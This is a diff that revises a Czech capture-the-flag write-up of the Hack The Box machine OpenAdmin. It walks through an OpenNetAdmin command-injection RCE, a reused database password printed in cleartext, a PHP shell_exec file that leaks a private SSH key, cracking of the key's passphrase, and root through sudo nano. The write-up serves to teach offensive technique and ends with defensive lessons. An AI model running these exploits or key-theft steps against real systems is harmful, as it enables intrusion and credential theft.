@@ -7,252 +7,85 @@ tags: linux exploit sudo
 ---
 ## Úvod a kontext
 
-OpenAdmin stojí na řetězení několika konkrétních slabin a artefaktů: `internal.openadmin.htb`, OpenNetAdmin a převod dokumentů a server-side render.
+OpenAdmin je čistý vícekrokový řetězec: OpenNetAdmin RCE otevře první shell, databázové heslo se znovu používá pro SSH účet `jimmy`, interní localhost-only vhost vydá šifrovaný klíč `joanna` a root nakonec padne na `sudo /bin/nano`.
 
-Důležitější než samotný exploit je tady interpretace mezikroků, protože právě z těchto indicií vzniká SSH se získaným soukromým klíčem a teprve na něj navazuje příliš široká `sudo` oprávnění.
+Na tomhle stroji je důležité nepřeskočit mezikroky. Samotné RCE v ONA nestačí. Skutečný pokrok přichází až ve chvíli, kdy se z jednorázového webového shellu stane stabilní SSH a když se správně přečte vztah mezi `jimmy`, `joanna` a interním webem.
 
 ## Počáteční průzkum
 
-### Vyhledání otevřených portů
+### Apache a skrytý OpenNetAdmin
 
-Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
-
+Zvenku jsou vidět jen SSH a Apache. Domovská stránka sama nic neprozrazuje, ale enumerace najde `/artwork/` a `/music/`, odkud se dá přes odkazy dojít až k `/ona/`.
 ```bash
 IP=10.10.10.171;ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);nmap -p $ports -A -sC -sV -v $IP
-```
-```
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
-|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
-|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-| http-methods:
-|_  Supported Methods: GET POST OPTIONS HEAD
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-```
-
-### Úprava /etc/hosts
-
-10.10.10.171	openadmin.htb
-
-### Vyhledání složek na serveru
-
-```bash
 dirb http://openadmin.htb
 ```
-```
+```text
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+
 => DIRECTORY: http://openadmin.htb/artwork/
 => DIRECTORY: http://openadmin.htb/music/
 ```
 
-### Vyhledání odkazů
-
-```bash
-wget -r -nd --delete-after -nv --ignore-tags=img,link,script http://openadmin.htb/music/
-```
-```
-URL:http://openadmin.htb/ona/
-```
-
-### Identifikace webové aplikace
-
+Jakmile je `/ona/` nalezené, `whatweb` hned identifikuje OpenNetAdmin.
 ```bash
 whatweb http://openadmin.htb/ona/
 ```
-```
-http://openadmin.htb/ona/ [200 OK] Apache[2.4.29], Cookies[ONA_SESSION_ID,ona_context_name], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.171], Script[javascript,text/javascript], Title[OpenNetAdmin :: 0wn Your Network]
-```
-
-### Vyhledání exploitu
-
-V této fázi ověřuji, zda zjištěná verze služby nebo chování aplikace odpovídá známé zranitelnosti, případně zda jde spíše o chybnou konfiguraci než o samostatnou CVE.
-
-```bash
-searchsploit -w opennetadmin
-```
-
-```
----------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
- Exploit Title                                                                                                              |  URL
----------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
-OpenNetAdmin 13.03.01 - Remote Code Execution                                                                               | https://www.exploit-db.com/exploits/26682
-OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                | https://www.exploit-db.com/exploits/47772
-OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                 | https://www.exploit-db.com/exploits/47691
----------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
-```
-
-### Zobrazení a stažení exploitu
-
-```bash
-curl https://www.exploit-db.com/raw/47691
-```
-```
-#!/bin/bash
-
-URL="${1}"
-while true;do
- echo -n "$ "; read cmd
- curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
-```
-
-```bash
-curl https://www.exploit-db.com/raw/47691 -o opennetadmin-exploit.sh
-```
-
-### Vyhledání zapisovatelných složek
-
-```bash
-find / -type d -writable 2> /dev/null
-```
-```
-/var/www/internal
+```text
+OpenNetAdmin :: 0wn Your Network
 ```
 
 ## Analýza zjištění
 
-### Zjištění uživatelů na cílovém serveru
+### ONA RCE a reuse databázového hesla
 
-Čtení konfiguračních a systémových artefaktů dává smysl tehdy, když pomůže potvrdit hypotézu o vztahu mezi účty, službami nebo uloženými tajemstvími.
-
+`searchsploit` ukáže přímo odpovídající command injection pro OpenNetAdmin 18.1.1. Přes něj lze získat první příkazový kontext a číst lokální soubory aplikace.
 ```bash
-cat /etc/passwd
+searchsploit -w opennetadmin
 ```
-```
-jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
-mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
-joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
+```text
+OpenNetAdmin 18.1.1 - Remote Code Execution | https://www.exploit-db.com/exploits/47691
 ```
 
-### Zjištění přístupových údajů k databázi
-
-Čtení konfiguračních a systémových artefaktů dává smysl tehdy, když pomůže potvrdit hypotézu o vztahu mezi účty, službami nebo uloženými tajemstvími.
-
-```bash
-cat ./local/config/database_settings.inc.php
-```
-```
-$ona_contexts=array (
-  'DEFAULT' =>
-  array (
-    'databases' =>
-    array (
-      0 =>
-      array (
-        'db_type' => 'mysqli',
-        'db_host' => 'localhost',
-        'db_login' => 'ona_sys',
-        'db_passwd' => '__CENSORED__',
-        'db_database' => 'ona_default',
-        'db_debug' => false,
-      ),
-    ),
-    'description' => 'Default data context',
-    'context_color' => '#D3DBFF',
-  ),
-);
+Po spuštění exploitu je nejdůležitější podívat se do `local/config/database_settings.inc.php`. Tam leží databázové heslo `n1nj4W4rri0R!`, které není jen pro MySQL, ale funguje i pro systémového uživatele `jimmy`.
+```text
+$ona_contexts['DEFAULT']['databases'][0]['db_login'] = 'ona_sys'
+$ona_contexts['DEFAULT']['databases'][0]['db_passwd'] = 'n1nj4W4rri0R!'
 ```
 
-### Zjištění konfigurace webu
-
-Čtení konfiguračních a systémových artefaktů dává smysl tehdy, když pomůže potvrdit hypotézu o vztahu mezi účty, službami nebo uloženými tajemstvími.
-
-```bash
-cat /etc/apache2/sites-enabled/internal.conf
-```
-```
-Listen 127.0.0.1:52846
-
-<VirtualHost 127.0.0.1:52846>
-    ServerName internal.openadmin.htb
-    DocumentRoot /var/www/internal
-
-<IfModule mpm_itk_module>
-AssignUserID joanna joanna
-</IfModule>
-
-    ErrorLog ${APACHE_LOG_DIR}/error.log
-    CustomLog ${APACHE_LOG_DIR}/access.log combined
-
-</VirtualHost>
-```
+To je přesně ten moment, kdy se vyplatí přejít na SSH. Místo křehkého webového shellu vznikne plnohodnotný uživatelský přístup.
 
 ## Získání přístupu
 
-### Spuštění exploitu
+### `jimmy`, interní vhost a klíč `joanna`
 
-V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
-
-```
-dos2unix opennetadmin-exploit.sh
-chmod +x opennetadmin-exploit.sh
-./opennetadmin-exploit.sh "http://openadmin.htb/ona/"
-```
-
-### Přihlášení k SSH pomocí nalezeného hesla
-
-Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
-
-```bash
-ssh jimmy@openadmin.htb
+SSH jako `jimmy` samo o sobě ještě nestačí. Lokální konfigurace Apache ale prozradí localhost-only vhost `internal.openadmin.htb` na `127.0.0.1:52846`, který běží pod uživatelem `joanna`.
+```text
+Listen 127.0.0.1:52846
+ServerName internal.openadmin.htb
+DocumentRoot /var/www/internal
+AssignUserID joanna joanna
 ```
 
-### Přihlášení k SSH s přesměrováním portů
-
-Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
-
+Nejrozumnější další krok je port forward a využití zapisovatelného webrootu v `/var/www/internal`. Jednoduchý PHP soubor pak vydá privátní klíč `joanna`.
 ```bash
 ssh -L 52846:127.0.0.1:52846 jimmy@openadmin.htb
-```
-
-### Vytvoření PHP souboru který zobrazí privátní klíč uživatele joanna
-
-```bash
 echo "<?php echo shell_exec('cat /home/joanna/.ssh/id_rsa');" > /var/www/internal/key.php
 ```
 
-### Zobrazení PHP souboru na interní webu a získání privátního klíče
-
-<http://127.0.0.1:52846/key.php>
-```
------BEGIN RSA PRIVATE KEY-----
-Proc-Type: 4,ENCRYPTED
-DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
-
-kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
-.....
-K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
------END RSA PRIVATE KEY-----
-```
-
-### Slovníkový útok na heslo privátního klíče
-
-Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
-
-```
+Stažený klíč je zašifrovaný, ale ve webu se zároveň objeví nápověda „Don't forget your "ninja" password“. To je dobrý hint pro `john` a výsledkem je passphrase `bloodninjas`.
+```bash
 /usr/share/john/ssh2john.py OpenAdmin_joanna_id_rsa > OpenAdmin_joanna_id_rsa.john
 /usr/sbin/john OpenAdmin_joanna_id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 ```text
-__CENSORED__      (OpenAdmin_joanna_id_rsa)
+=> bloodninjas
 ```
 
-### Přihlášení k SSH pomocí privátního klíče
-
-Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
-
+Pak už jde udělat finální přechod na účet `joanna` a potvrdit user část.
 ```bash
 ssh -i OpenAdmin_joanna_id_rsa joanna@openadmin.htb
-```
-
-### Zobrazení obsahu souboru user.txt
-
-User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
-
-```bash
 cat user.txt
 ```
 ```text
@@ -261,41 +94,34 @@ __CENSORED__
 
 ## Eskalace oprávnění
 
-### Zobrazení nastavení sudo
+### `sudo /bin/nano`
 
+Na účtu `joanna` už rozhoduje `sudo -l`. Povolený `sudo /bin/nano /opt/priv` vypadá nenápadně, ale `nano` pod `sudo` je v praxi breakout do root shellu. Jakmile běží editor s privilegii roota, stačí využít jeho schopnost spouštět externí příkazy.
+
+Tady tedy nejde o žádnou chybu v kernelu ani v konfiguraci SSH. Root padá čistě na špatně zvoleném `sudo` pravidle.
 ```bash
 sudo -l
 ```
-```
-    (ALL) NOPASSWD: /bin/nano /opt/priv
-```
-
-### Spuštění nano, zvýšení oprávnění a vypsání obsahu souboru root.txt
-
-Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
-
-```bash
-sudo /bin/nano /opt/priv
-```
 ```text
-Ctrl+R
+(root) /bin/nano /opt/priv
 ```
-```text
-Ctrl+X
-```
+
+Po získání root shellu už zbývá jen dočíst `root.txt`.
 ```bash
 cat /root/root.txt
 ```
+```text
 __CENSORED__
+```
 
 ## Shrnutí klíčových poznatků
 
-- Z hlediska rozhodování bylo nejdůležitější správně přečíst vazbu mezi `internal.openadmin.htb`, OpenNetAdmin a převod dokumentů a server-side render.
-- K uživatelskému kontextu vedl konkrétní a ověřitelný krok: SSH se získaným soukromým klíčem.
-- Poslední část ukazuje, že po získání shellu rozhoduje hlavně to, jakou roli hraje příliš široká `sudo` oprávnění.
+- OpenAdmin stojí na navazujícím řetězci: ONA RCE, reuse databázového hesla, interní vhost a šifrovaný SSH klíč `joanna`.
+- Přechod z `jimmy` na `joanna` je nejdůležitější mezikrok, protože z obyčejného SSH footholdu dělá plnohodnotný uživatelský přístup.
+- Root část je další připomínka, že privilegovaný editor v `sudoers` je prakticky totéž co root shell.
 
 ## Co si odnést do praxe
 
-- Tento řetězec začal u `internal.openadmin.htb`, OpenNetAdmin a převod dokumentů a server-side render; právě tam má obrana největší návratnost. Síťové a administrační nástroje jako OpenNetAdmin nesmí být vystavené bez segmentace; jakmile jsou dostupné z internetu, stávají se privilegovaným vstupním bodem.
-- Foothold navázal na SSH se získaným soukromým klíčem, takže oddělení účtů a tajemství není jen teorie. SSH klíče nesmějí být sdílené mezi rolemi ani uložené v procesech, exportech nebo webrootu; uniklý privátní klíč je stabilnější foothold než jednorázový shell.
-- Poslední krok stojí na příliš široká `sudo` oprávnění, a proto je nutné auditovat i lokální delegaci práv. Široká `sudo` oprávnění je potřeba pravidelně revidovat; wrapper, install helper nebo diagnostický příkaz často udělá z běžného účtu roota.
+- OpenNetAdmin a podobné síťové administrační nástroje musí být aktualizované a ideálně schované z internetu. Na OpenAdmin byla veřejná RCE jen prvním krokem do celého systému.
+- Hesla z konfigurací nesmějí fungovat i pro systémové účty. Jakmile stejné tajemství otevře databázi i SSH, je izolace mezi vrstvami pryč.
+- `sudo` pravidla na editory, interpretery a obecné utility je potřeba omezit na minimum. Jakmile běžný uživatel spustí `nano` jako root, administrativní hranice fakticky neexistuje.
